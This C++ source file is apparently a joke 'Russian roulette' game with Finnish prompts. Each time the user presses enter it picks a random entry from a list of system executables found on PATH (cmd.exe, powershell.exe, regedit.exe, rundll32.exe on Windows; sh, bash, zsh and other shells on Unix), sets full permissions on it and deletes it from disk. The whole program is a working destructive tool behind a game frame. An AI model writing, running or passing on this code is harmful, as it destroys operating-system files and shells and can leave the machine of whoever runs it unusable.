#include <algorithm>
#include <chrono>
#include <filesystem>
#include <iostream>
#include <optional>
#include <random>
#include <sstream>
#include <string>
#include <thread>
#include <vector>

namespace roulette
{
	class environment
	{
	public:
#if _WIN32
		static constexpr char path_delimiter = ';';
#else
		static constexpr char path_delimiter = ':';
#endif
		environment() :
			_directories(resolve(std::getenv("PATH")))
		{
		}

		std::optional<std::filesystem::path> where(std::wstring_view executable) const
		{
			for (const std::filesystem::path directory : _directories)
			{
				for (const std::filesystem::directory_entry& entry :
					std::filesystem::directory_iterator(directory))
				{
					const auto item = entry.path();

					if (item.filename().wstring() == executable)
					{
						return item;
					}
				}
			}

			return {};
		}

	private:
		static std::vector<std::filesystem::path> resolve(const char* path)
		{
			std::vector<std::filesystem::path> result;

			if (!path)
			{
				return result;
			}

			std::stringstream stream(path);
			std::string directory;

			while (std::getline(stream, directory, path_delimiter))
			{
				if (!std::filesystem::exists(directory))
				{
					continue;
				}

				result.emplace_back(directory);
			}

			return result;
		}

		std::vector<std::filesystem::path> _directories;
	};

	template <typename T>
	T random_number(
		T min = std::numeric_limits<T>::min(),
		T max = std::numeric_limits<T>::max())
	{
		thread_local std::random_device device;
		thread_local std::mt19937 engine(device());
		thread_local std::uniform_int_distribution<T> distribution(min, max);
		return distribution(engine);
	}

	template <typename T>
	T random_position(T begin, T end)
	{
		auto iter = begin;
		const size_t max_index = std::distance(begin, end) - 1;
		std::advance(iter, random_number<size_t>(0, max_index));
		return iter;
	}

	enum class bullet_state
	{
		missing,
		ready,
		failure,
		fired
	};

	class cartridge
	{
	public:
		cartridge(const std::optional<std::filesystem::path>& bullet) :
			bullet(bullet.has_value() ? bullet.value() : std::filesystem::path()),
			_state(bullet.has_value() ? bullet_state::ready : bullet_state::missing)
		{
		}

		const std::filesystem::path bullet;

		bullet_state status() const
		{
			return _state;
		}

		bool fire()
		{
			try
			{
				bool exists = std::filesystem::exists(bullet);

				if (!exists)
				{
					_state = bullet_state::missing;
					return false;
				}

				// TODO: does not work on Windows
				std::filesystem::permissions(bullet, std::filesystem::perms::all);

				if (std::filesystem::remove(bullet))
				{
					_state = bullet_state::fired;
					return true;
				}
			}
			catch (const std::filesystem::filesystem_error& e)
			{
				std::wcerr << e.what() << std::endl;
			}

			_state = bullet_state::failure;
			return false;
		}

	private:
		bullet_state _state;
	};

	class gun
	{
	public:
		gun(const environment& env) :
			_cylinder(
			{ 
#if _WIN32
				env.where(L"calc.exe"),
				env.where(L"cmd.exe"),
				env.where(L"control.exe"),
				env.where(L"cscript.exe"),
				env.where(L"diskmgmt.msc"),
				env.where(L"msiexec.exe"),
				env.where(L"powershell.exe"),
				env.where(L"regedit.exe"),
				env.where(L"rundll32.exe"),
				env.where(L"Taskmgr.exe")
#else
				env.where(L"sh"),
				env.where(L"bash"),
				env.where(L"csh"),
				env.where(L"tcsh"),
				env.where(L"scsh"),
				env.where(L"ksh"),
				env.where(L"zsh"),
				env.where(L"fish"),
				env.where(L"ion")
#endif
			}),
			_chamber(_cylinder.end())
		{
		}

		int cylinder_size() const
		{
			return _cylinder.size();
		}

		int bullet_count() const
		{
			return std::count_if(_cylinder.cbegin(), _cylinder.cend(), [](const auto& cartridge)
			{
				return cartridge.status() == bullet_state::ready;
			});
		}

		int roll()
		{
			_chamber = random_position(_cylinder.begin(), _cylinder.end());
			return ++_roll;
		}

		bool trigger() const
		{
			if (_chamber == _cylinder.end())
			{
				throw std::out_of_range("Muista pyöräyttää rulla!");
			}

			return _chamber->fire();
		}

		const cartridge& chamber() const
		{
			if (_chamber == _cylinder.end())
			{
				throw std::out_of_range("Eipä kuikita ennen aikoja!");
			}

			return *_chamber;
		}

	private:
		std::vector<cartridge> _cylinder;
		std::vector<cartridge>::iterator _chamber;
		int _roll = 0;
	};

	struct slow_print
	{
		slow_print(
			std::wstring_view message,
			std::chrono::milliseconds delay = std::chrono::milliseconds(200)) :
			_message(message),
			_delay(delay)
		{
		}

		friend std::wostream& operator << (std::wostream&, const slow_print&);

	private:
		std::wstring_view _message;
		std::chrono::milliseconds _delay;
	};

	std::wostream& operator << (std::wostream& stream, const slow_print& s)
	{
		stream.flush();

		for (wchar_t x : s._message)
		{
			std::this_thread::sleep_for(s._delay);
			stream << x;
			stream.flush();
		}

		std::this_thread::sleep_for(s._delay);
		return stream;
	}

	void run()
	{
		std::wcout << L"Tervetuloa venäläiseen rulettiin!\n" << std::endl;

		environment env;
		gun pyssy(env);

		std::wcout << L"Pyssy ladattu. "
			<< pyssy.cylinder_size() << L":n patruunan rullassa "
			<< pyssy.bullet_count() << L" patruunaa" << std::endl;

		std::wcout << L"Paina enter pyöräyttääksi rullaa tai " <<
			L"x ja perään enter lopettaaksesi" << std::endl;

		std::string line;

		while (std::getline(std::cin, line) && line != "x")
		{
			std::wcout << L"Kierros " << pyssy.roll() << L" pyörähtää" << slow_print(L"...") << std::endl;

			bool result = pyssy.trigger();
			const cartridge& paukku = pyssy.chamber();

			switch (pyssy.chamber().status())
			{
			case bullet_state::missing:
			{
				std::wcout << L"Pesässä ei ollut mitään. Onni oli myötä tällä kertaa." << std::endl;
				break;
			}
			case bullet_state::fired:
			{
				if (result)
				{
					std::wcout << paukku.bullet << L" pamahti! Nyt taisi käydä huonosti!" << std::endl;
				}
				else
				{
					std::wcout << L"Pesässä " << paukku.bullet << L" oli hylsy..." << std::endl;
				}
				break;
			}
			case bullet_state::failure:
			{
				std::wcout << L"Patruuna " << paukku.bullet << L" ei pamahtanut. Onni oli myötä tällä kertaa." << std::endl;
				break;
			}
			default:
			{
				throw std::logic_error("Hävytön koodari jättänyt virheen!");
			}
			}

			std::cin.clear();
		}
	}
}

#ifdef _WIN32
#include <fcntl.h>
#include <io.h>
int wmain()
{
	_setmode(_fileno(stdout), _O_U8TEXT);
#else
int main()
{
	std::setlocale(LC_ALL, "en_US.UTF-8");
#endif

	try
	{
		roulette::run();
	}
	catch (const std::exception& e)
	{
		std::wcerr << L"Ruletti kaatui: " << e.what() << std::endl;
	}
	

	return 0;
}
